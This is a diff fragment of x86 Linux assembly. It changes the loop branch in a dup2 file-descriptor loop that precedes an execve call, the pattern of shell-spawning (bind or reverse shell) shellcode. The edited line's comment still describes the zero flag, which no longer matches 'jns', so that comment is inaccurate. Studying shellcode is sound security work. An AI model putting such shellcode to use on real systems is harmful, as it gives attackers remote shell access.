@@ -56,7 +56,7 @@ loop:
 	mov    al,0x3f  ;syscall: sys_dup2 
 	int    0x80     ;exec sys_dup2
 	dec    cl       ; decrement counter
-	jne    loop  ;jump to loop label if ZF is not equal to 0 (controlled by decrementing cl)
+	jns    loop  ;jump to loop label if ZF is not equal to 0 (controlled by decrementing cl)
 
 ;execve
 xor    eax,eax
